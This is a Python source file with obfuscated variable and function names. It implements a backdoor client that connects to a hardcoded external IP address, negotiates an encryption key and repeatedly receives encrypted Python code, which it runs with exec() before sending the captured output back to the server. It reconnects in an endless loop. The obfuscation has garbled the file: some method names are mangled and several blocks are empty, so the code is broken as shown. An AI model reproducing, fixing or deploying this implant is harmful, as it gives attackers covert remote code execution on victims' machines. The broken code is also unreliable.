import io
import os
import sys
import time
import socket
import base64
import random
import signal
import hashlib
import subprocess
from threading import Thread
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa



qMtMdUsIHhtJmqyg = []
actOVqyvyWENgTGgpUZe_connections = []

def egWLMrlwPLxQTgxe(sig, frame):

    for WueBmGTfwKVeBkSr_socket in qMtMdUsIHhtJmqyg:
        WueBmGTfwKVeBkSr_socket.close()

    sys.exit(0)

signal.signal(signal.SIGINT, egWLMrlwPLxQTgxe)

sQnnVydxcYLATjhE = """-----BEGIN RSA PUBLIC KEY-----
MIICCgKCAgEAmPJ5v+Wh5OQSMe2WvXwkLVME19/I5n6JRCCwMhXpN9LYUJl/Z0yr
Od8XRCq4/LvuIkEV8uJGC1QwH1cEqGNhrPIOKzR6j/1PlCpwCwxi1lFdrEf0Jy2F
9Q8VW7z/wQEC9uUKwnsZG7R5ZP4uKQh4ElbW00aYPIblCtAXqHHRRnHcFMmPh0T50+buxyKFG2G220
fYfjacHPkBuss3RZnyc2KsZC2GsS8siSE7tQFmLZwtRgV4IYTSwzupGDxhzc1shA
TVOat0fdp/m5OuGrJuBGsu0R0jNUiTwILPYm925a84qQyGn01UBpHy8kKnG5SyVG
F+6L91zsCosp85BpCNsUdaAV9qe5m/W4KTQgXttyp+KwrX+tuyvbtq8JPNvCbiB3
ibA4ZiSVrL0/laNyJj7UPJPQXXWXErMgPTRd4eb0RJCAbs1uem113jXh14a9JrJW
qo6XvXQuvpDWK2qIh0nbxO7hAWpGg+ujSFjl15ZeGkmlMKaJKaD0j3sEQPYiUdzo
LfjPJdFA0v9Da3LCXX+lkoy+NfdL2HfVjC8heMZw+d56sV84Kxqnu8jBM5wHoTvw
ObLJHw7wp0Aa/7Q7Mb0rbNT5g6+sXMSBrEUp6rSF+ONYYGlrVs2WZG8jqxjqN+Wx
l7zPR7yGdgZbdHk8ctXLOqOqdRObDc8upwOzuCYvrkb1T+iDZtxV3sECAwEAAQ==
-----END RSA PUBLIC KEY-----
"""

sQnnVydxcYLATjhE = sQnnVydxcYLATjhE.encode('utf-8')

ocWghRchstumbpTY = serialization.load_pem_ocWghRchstumbpTY(sQnnVydxcYLATjhE)

def ftBAQOEnOUyPfxHP(ocWghRchstumbpTY, code_snippet):

    LIESAOGbGEbgbZzg = ocWghRchstumbpTY.key_size

    djtumhMIvxdEVlqi = (LIESAOGbGEbgbZzg // 8 ) - 2 * hashes.SHA256().digest_size - 2

    if len(code_snippet) > djtumhMIvxdEVlqi:
        sys.exit(0)

    try:
        uvfelrrTxzpThJGx = ocWghRchstumbpTY.encrypt(
            code_snippet,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
    except Exception as e:
        sys.exit(1)

    dxwRdzjwuLIEqkhM = base64.b64encode(uvfelrrTxzpThJGx).decode('utf-8')
    return dxwRdzjwuLIEqkhM


def dXzPYPOVJyTQXQbC(WueBmGTfwKVeBkSr):
    JHOSlkdEBoPfzsuu = WueBmGTfwKVeBkSr.recv(4096)
    JHOSlkdEBoPfzsuu = JHOSlkdEBoPfzsuu.decode()

    n, g = JHOSlkdEBoPfzsuu.split(',')
    n = int(n)
    g = int(g)

    x = random.randint(1, n - 1)
    LyzCgBgbbbsfVzTO = int(pow(g, x, n))

    LyzCgBgbbbsfVzTO = str(LyzCgBgbbbsfVzTO)
    WueBmGTfwKVeBkSr.send(LyzCgBgbbbsfVzTO.encode())

    PIblCtAXqHHRRnHc = WueBmGTfwKVeBkSr.recv(4096)
    PIblCtAXqHHRRnHc = int(PIblCtAXqHHRRnHc.decode())

    IprPRUGPgPxeqSzJ = pow(PIblCtAXqHHRRnHc, x, n)

    KJUFtoucXsSEHDdw = int.to_bytes(IprPRUGPgPxeqSzJ, length=(IprPRUGPgPxeqSzJ.bit_length() + 7) // 8, byteorder='big')
    KJUFtoucXsSEHDdw = hashlib.sha256(KJUFtoucXsSEHDdw).digest()

    return KJUFtoucXsSEHDdw


def sXuzfYPbWjAeixHY(JkChsGzUWTZKdJev, wRlnonlPkORKFGSn, MtXzQLkRlIPeoSiL, aAVRmgmggihfGFAK):

    if (JkChsGzUWTZKdJev, wRlnonlPkORKFGSn) in actOVqyvyWENgTGgpUZe_connections:
        return

    WueBmGTfwKVeBkSr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    WueBmGTfwKVeBkSr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    qMtMdUsIHhtJmqyg.append(WueBmGTfwKVeBkSr)

    try:
        WueBmGTfwKVeBkSr.connect((JkChsGzUWTZKdJev, wRlnonlPkORKFGSn))
        actOVqyvyWENgTGgpUZe_connections.append((JkChsGzUWTZKdJev, wRlnonlPkORKFGSn))
        
        KJUFtoucXsSEHDdw = dXzPYPOVJyTQXQbC(WueBmGTfwKVeBkSr)

        BbaMzRNjvImniMXR = "abd660358dd97c26a1136f5e7bf3b7243ae82e4f9b93370e53e7857fae61b43a"
        try:
            encrypted_BbaMzRNjvImniMXR = kOjcdZaBvPTKpVzz(KJUFtoucXsSEHDdw, BbaMzRNjvImniMXR.encode())
            WueBmGTfwKVeBkSr.send(encrypted_BbaMzRNjvImniMXR)
        except Exception as e:
            pass

        NHLUBCsXMbHRNvhO = "b7afd39a9616dbecb8e9834f817c929096223bf9930b6339ee1bf4a0a65eb9f4"
        try:
            NHLUBCsXMbHRNvhO = kOjcdZaBvPTKpVzz(KJUFtoucXsSEHDdw, NHLUBCsXMbHRNvhO.encode())
        except Exception as e:
            pass


        while True:

            WueBmGTfwKVeBkSr.send(NHLUBCsXMbHRNvhO)

            NIYcdoBWpjDxBAOa = WueBmGTfwKVeBkSr.recv(4096)
            try:
                decrypted_NIYcdoBWpjDxBAOa = kJgsRNsVuhuroZGO(KJUFtoucXsSEHDdw, NIYcdoBWpjDxBAOa)
            except Exception as e:
                continue

            cUktthdGWDWNDADh = sys.stdout
            lLYRFRIOmxADwIqV = io.StringIO()
            sys.stdout = lLYRFRIOmxADwIqV

            try:
                exec(decrypted_NIYcdoBWpjDxBAOa)
                vEUCnrsqRrZKRApt = lLYRFRIOmxADwIqV.getvalue()
                if vEUCnrsqRrZKRApt:
                elif vEUCnrsqRrZKRApt == "":
                    vEUCnrsqRrZKRApt = "empty JHOSlkdEBoPfzsuu"
            except Exception as e:
                vEUCnrsqRrZKRApt = e
            finally:
                sys.stdout = cUktthdGWDWNDADh


            UnEnjxQSMNcGkxjp = kOjcdZaBvPTKpVzz(KJUFtoucXsSEHDdw, vEUCnrsqRrZKRApt.encode())
            WueBmGTfwKVeBkSr.send(UnEnjxQSMNcGkxjp)

            time.sleep(1)


    except Exception as e:

    finally:
        if (JkChsGzUWTZKdJev, wRlnonlPkORKFGSn) in actOVqyvyWENgTGgpUZe_connections:
            actOVqyvyWENgTGgpUZe_connections.remove((JkChsGzUWTZKdJev, wRlnonlPkORKFGSn))

        WueBmGTfwKVeBkSr.close()

def kOjcdZaBvPTKpVzz(key, KmKzhabSHuTCxWVl):
    OVqyvyWENgTGgpUZ = os.urandom(16)
    YCStorOKCGGZmiUU = Cipher(algorithms.AES(key), modes.CBC(OVqyvyWENgTGgpUZ), backend=default_backend())
    encryptor = YCStorOKCGGZmiUU.encryptor()

    hKthuTgjleYFMJJc = sym_padding.PKCS7(algorithms.AES.block_size).hKthuTgjleYFMJJc()
    uNGmIoDaxlSpntSv = hKthuTgjleYFMJJc.update(KmKzhabSHuTCxWVl) + hKthuTgjleYFMJJc.finalize()

    YCStorOKCGGZmiUUtext = encryptor.update(uNGmIoDaxlSpntSv) + encryptor.finalize()
    return OVqyvyWENgTGgpUZ + YCStorOKCGGZmiUUtext

def kJgsRNsVuhuroZGO(key, encrypted_message):
    OVqyvyWENgTGgpUZ = encrypted_message[:16]
    YCStorOKCGGZmiUUtext = encrypted_message[16:]

    YCStorOKCGGZmiUU = Cipher(algorithms.AES(key), modes.CBC(OVqyvyWENgTGgpUZ), backend=default_backend())
    iHrHHXRNCgNjTUct = YCStorOKCGGZmiUU.iHrHHXRNCgNjTUct()

    padded_KmKzhabSHuTCxWVl = iHrHHXRNCgNjTUct.update(YCStorOKCGGZmiUUtext) + iHrHHXRNCgNjTUct.finalize()

    tVcoHusjPhEshKtu = sym_padding.PKCS7(algorithms.AES.block_size).tVcoHusjPhEshKtu()
    KmKzhabSHuTCxWVl = tVcoHusjPhEshKtu.update(padded_KmKzhabSHuTCxWVl) + tVcoHusjPhEshKtu.finalize()

    return KmKzhabSHuTCxWVl.decode('utf-8')


if __name__ == "__main__":

    JkChsGzUWTZKdJev = "34.204.78.186"
    wRlnonlPkORKFGSn = int(65500)
    MtXzQLkRlIPeoSiL = prOVqyvyWENgTGgpUZate_ip = "127.0.0.1"
    aAVRmgmggihfGFAK = 1239

    while True:
        try:
            sXuzfYPbWjAeixHY(JkChsGzUWTZKdJev, wRlnonlPkORKFGSn, MtXzQLkRlIPeoSiL, aAVRmgmggihfGFAK)
        except Exception as e:
            time.sleep(1)
            continue

        time.sleep(5)
